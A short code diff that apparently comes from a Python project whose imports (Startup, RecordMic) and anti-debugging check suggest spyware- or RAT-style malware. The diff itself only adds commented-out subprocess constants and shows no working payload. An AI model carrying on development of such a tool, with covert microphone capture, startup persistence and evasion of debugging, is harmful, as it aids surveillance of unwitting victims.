@@ -16,6 +16,11 @@ from modules.startup import Startup
 from modules.mic import RecordMic
 
 
+#PIPE = -1
+#STDOUT = -2
+#DEVNULL = -3
+
+
 if ANTIDEBUG:
     try:
         if Antidebug().main():
